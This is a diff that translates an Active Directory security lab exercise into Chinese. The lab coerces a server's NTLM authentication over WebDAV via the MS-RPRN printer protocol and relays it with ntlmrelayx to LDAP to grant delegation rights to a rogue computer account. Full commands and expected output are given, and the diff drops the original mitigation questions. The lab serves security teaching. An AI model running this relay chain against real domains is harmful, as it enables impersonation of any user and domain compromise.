@@ -2,52 +2,76 @@
 
 ## Preparations
 
-Install the Webclient service to enable WebDav support on ADSEC-01. 
+在AD-01安裝 Webclient service，以支援WebDav Client功能
 
-```
+```powershell
 Install-WindowsFeature WebDAV-Redirector
 ```
 
-Reboot the server, log back in and set the startup type for the new services to automatic.
+- 重啟後，使用以下腳本讓WEBDAV開機時自動啟動
 
-```
+```powershell
 Get-Service mrxdav,webclient | Set-Service -StartupType Automatic
 ```
 
-Start manually and check to make sure they are running.
+- 使用以下腳本確認服務是否開啟
 
-```
+```powershell
 start-service mrxdav,webclient
 get-service mrxdav,webclient
 ```
 
-These are services that are usually not installed on Servers but they are by default installed on clients. If the Webclient service is installed and running, it allows for a different attack avenue we'd like to highlight below, which is a cross-protocol NTLM relay.
+WebDav通常預設不會再Sever上安裝，但是Desktop版本的作業系統通常會預設安裝(如Onedrive就有此功能)，故實務上使用WEBDAV做NTLM Relay是可行的。
 
 ## Tools
 
-You can find all tools needed in the ["attacker-tools.zip"-file](../exercises/attacker-tools). The links below are for your own reference.
-
-Tools needed:
+使用工具如下:
 
 - Impacket: [https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)
 - SpoolSample: [https://github.com/leechristensen/SpoolSample](https://github.com/leechristensen/SpoolSample)
 - Powermad: [https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1](https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1)
 
+## Theory
+
+本練習利用微軟MS-RPRN(印表機)協定的設計缺陷，強制AD-01使用Computer account(AD-01$)對AD-01發起NTLM驗證，並將該驗證Relay到AD-DC上，執行RDBC委派(為後續內容)，並讓我們創建的computer account **$evilpc** 對AD-01有RDBC權限，可偽冒 **任意使用者** 使用AD-01上的 **任意服務**
+
+### NTLM 驗證
+
+![](../images/2022-06-16-11-47-49.png)
+
+### NTLM Relay場景
+
+![](../images/2022-06-16-11-53-36.png)
+
+### PRPN Problem
+
+- MSRPRN:拿來控制windows印表機共用的協定
+    - 角色:
+        - 客戶端(Client)
+        - 共用印表機的電腦(Printer Server)
+        - 印表機
+    - Client:可管理Printer Server新增印表機及驅動等動作
+    - **Client可要求Printer Server對印表機變動時自動通知Client**
+
+![](../images/2022-06-16-11-57-53.png)
+
+### UNC Path and WebDav
+
+![](../images/2022-06-16-11-58-40.png)
+
 ## Exercise
 
-In this exercise, we'll use a design flaw in the MS-RPRN protocol to coerce authentication of a computer account and then forward that authentication to the domain controller to manipulate the victims computer object in the directory. A similar attack can be invoked by abusing the MS-EFSRPC protocol, better known as the [PetitPotam attack](https://github.com/topotam/PetitPotam).
+本攻擊包含以下步驟
 
-The attack consists of three steps:
-
-1) Create a new computer account
-2) Set up a ntlm relay server
-3) Trigger authentication
+1) 創建新computer account evilpc
+2) 在AD-00設定NTLM-Relay Server
+3) 使用MS-RPRC協定觸發AD-01向AD-00發起認證
 
 ### Create a new computer account
 
-The reason why we need to create a computer account is the fact that a computer account has an SPN by default and we need that lateron when we're talking about Kerberos delegation. Just accept this as given for now, we'll go into more detail soon ;-)
+為了實作kerberos delegation此處需先創建一個computer account **evilpc**，在實驗六會在詳細解釋原理。
 
-```
+```powershell
 cd C:\attacker-tools\
 cat -raw .\Powermad.ps1 | iex
 New-MachineAccount -MachineAccount evilpc -Password (ConvertTo-SecureString -String "EvilPassword1" -AsPlainText -Force)
@@ -55,26 +79,36 @@ New-MachineAccount -MachineAccount evilpc -Password (ConvertTo-SecureString -Str
 
 ### Set up a ntlm relay server
 
-Set up your relay server with ntlmrelayx like this.
+使用ntlmrelayx.py工具，在AD-00發起一個NTLM relay server
 
-```
-ntlmrelayx.py --no-smb-server --delegate-access --escalate-user evilpc$ -t ldap://adsec-dc.contoso.com
-```
-
- - **--no-smb-server** prevent ntlmrelayx from starting it's own smb service on port 445 which wouldn't be possible anyway since the Windows smb service is using that port. 
- - **--delegate-access** this tells ntlmrelayx that we want to modify the permissions for RBCD (ressource-based constrained kerberos delegation) on the victims computer account.
- - **--escalate-user evilpc$** we want to give those delegation permissions to the computer account we created earlier.
- - **-t ldap://adsec-dc.contoso.com** the target of the NTLM relay. The terminology can be confusing but from the relaying tools point of view, the original victim (will be ADSEC-01) is the source and the domain controllers LDAP service is the target. In a nutshell, this switch is about where you want to use those stolen credentials.
-
-### Trigger authentication
-
-Finally, trigger an authentication from ADSEC-01 using the SpoolSample.exe from attacker tools. Execute the command below in a different shell, while keeping ntlmrelayx running.
-
-```
- .\SpoolSample.exe adsec-01 adsec-00@80/foobar
+```powershell
+ntlmrelayx.py --no-smb-server --delegate-access --escalate-user evilpc$ -t ldap://ad-dc.contoso.com
 ```
 
-If the attack worked, you should see something like this in the ntlmrelayx-console. 
+- **--no-smb-server**:不發起SMB Server，因為此處是使用WEBDAV服務(HTTP)作為NTLM的載體。
+
+- **--delegate-access**:定義在ntlm relay後，要向ad-dc變更AD-01的RBCD權限
+
+ - **--escalate-user evilpc$** 使$evilpc擁有AD-01的RBCD權限。
+
+ - **-t ldap://ad-dc.contoso.com** 定義ntlm relay的目標，此處為使用ldap協議向ad-dc發起RBCD的權限變更。
+
+NTLM為一個內嵌的認證協議，實際上可運用在HTTP、LDAP以及SMB等常見的windows內網協定上。
+
+### 使用MS-RPRC協定觸發驗證
+
+使用SpoolSample.exe使用MS-RPRC協定觸發ad-01向ad-00發起WEBDAV(HTTP)的NTLM協定。
+
+```
+ .\SpoolSample.exe ad-01 ad-00@80/foobar
+```
+
+**UNC Path格式如下**:
+- \\\ad-00 =>發起SMB認證
+- \\\ad-00@80 => 對80 port 發起webdav認證
+
+
+- 如果攻擊成功將會在ad-00的NTLM relay的程式視窗看到以下結果: 
 
 ```
 [*] HTTPD: Received connection from 10.200.200.101, attacking target ldap://adsec-dc.contoso.com
@@ -88,20 +122,20 @@ If the attack worked, you should see something like this in the ntlmrelayx-conso
 [*] evilpc$ can now impersonate users on ADSEC-01$ via S4U2Proxy
 ```
 
-Verify by checking the corresponding attribute on the computer object with PowerView.
+使用 PowerView 可查看 ad-01成功對evil-pc這個computer account授予RBCD權限。
 
-```
+```powershell
 cat -raw ".\PowerView.ps1" | iex
-Get-DomainComputer adsec-01 | select msds-allowedtoactonbehalfofotheridentity
+Get-DomainComputer ad-01 | select msds-allowedtoactonbehalfofotheridentity
+
+#取得RBCD的RawData
+$RawBytes = Get-DomainComputer ad-01 | select -expand msds-allowedtoactonbehalfofotheridentity
+
+
+#轉換為 sid
+(New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0).DiscretionaryAcl
+
+#將sid轉換為可辨識的帳號 sid為上一步取得
+ConvertFrom-Sid sid
+
 ```
-
-You should see that the attribute msds-allowedtoactonbehalfofotheridentity is now set and contains just a long list of digits. The reason is that this attribute does not contain just a simple account name but an ACL (like on a file) in the Microsoft SDDL format, which is stored in its binary representation here. Making this readable will be one of your challenges below.
-
-You might wonder what we are going to do with those fancy delegation permissions we just acquired. We'll get to that in exercise 6 but first we have to learn more about Kerberos :-)
-
-## Questions
-
-- What is the best way to prevent normal users from creating computer accounts? Document the necessary configuration steps.
-- Find the Powershell commands necessary to make this attribute readable and document them. You'll only need Powerview and what Powershell offers you natively. Hint: have a look at the blog posts here [https://posts.specterops.io](https://posts.specterops.io)
-- Read [this guidance from the Carnegie Mellon CERT](https://www.kb.cert.org/vuls/id/405600) on how to mitigate PetitPotam. The article describes the use of an RPC filter to block the MS-EFSRPC procotol and therefore preventing coerced authentication. Adapt the RPC filter from the article to block MS-RPRN instead and apply it to ADSEC-01. Test the attack again, and see if it still works.
-    - Hint: you'll need the UUID of the MS-RPRN protocol.
